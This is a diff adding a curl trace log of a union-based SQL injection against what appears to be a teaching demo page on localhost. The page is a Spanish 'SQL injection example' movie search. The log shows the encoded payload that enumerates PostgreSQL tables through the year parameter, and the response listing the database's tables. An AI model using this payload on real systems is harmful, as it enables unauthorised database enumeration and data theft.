@@ -1,0 +1,44 @@
+$ curl "http://localhost/xSearchInjection.php?i_anio=1994%27%20and%201%3D0%20union%20all%20select%20tablename%20as%20movietitle%20from%20pg_catalog.pg_tables%20where%20schemaname%20in%20(select%20nspname%20from%20pg_namespace%20where%20oid%20%3D%202200)%3B%20--" --trace-ascii d.txt
+
+== Info:   Trying ::1...
+== Info: TCP_NODELAY set
+== Info: Connected to localhost (::1) port 80 (#0)
+=> Send header, 309 bytes (0x135)
+0000: GET /xSearchInjection.php?i_anio=1994%27%20and%201%3D0%20union%2
+0040: 0all%20select%20tablename%20as%20movietitle%20from%20pg_catalog.
+0080: pg_tables%20where%20schemaname%20in%20(select%20nspname%20from%2
+00c0: 0pg_namespace%20where%20oid%20%3D%202200)%3B%20-- HTTP/1.1
+00fc: Host: localhost
+010d: User-Agent: curl/7.57.0
+0126: Accept: */*
+0133: 
+<= Recv header, 17 bytes (0x11)
+0000: HTTP/1.1 200 OK
+<= Recv header, 17 bytes (0x11)
+0000: Host: localhost
+<= Recv header, 39 bytes (0x27)
+0000: Date: Tue, 19 Dec 2017 11:30:35 +0000
+<= Recv header, 19 bytes (0x13)
+0000: Connection: close
+<= Recv header, 25 bytes (0x19)
+0000: X-Powered-By: PHP/7.2.0
+<= Recv header, 40 bytes (0x28)
+0000: Content-type: text/html; charset=UTF-8
+<= Recv header, 2 bytes (0x2)
+0000: 
+<= Recv data, 857 bytes (0x359)
+0000: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> 
+0040: .<html>.  <head>.    <meta http-equiv="Content-Type" content="te
+0080: xt/html; charset=UTF-8">.    <title>Ejemplo de SQL injection</ti
+00c0: tle>.  </head>.  <body>.    <h2> Ejemplo de SQL injection: Infor
+0100: maci..n en la BD</h2>.      <form name="consultaanio" method="ge
+0140: t" action="xSearchInjection.php">.        Pel..culas del a..o: <
+0180: input name="i_anio"/><br/>.        <input type="submit" value="M
+01c0: ostrar"/>.      </form>.    <ol>.<li>customers</li>.<li>imdb_act
+0200: ormovies</li>.<li>imdb_actors</li>.<li>imdb_movies</li>.<li>imdb
+0240: _movielanguages</li>.<li>inventory</li>.<li>orderdetail</li>.<li
+0280: >orders</li>.<li>products</li>.<li>imdb_directors</li>.<li>imdb_
+02c0: directormovies</li>.<li>imdb_moviegenres</li>.<li>countries</li>
+0300: .<li>imdb_moviecountries</li>.<li>genres</li>.<li>languages</li>
+0340: .</ol>.  </body>.</html>.
+== Info: Closing connection 0
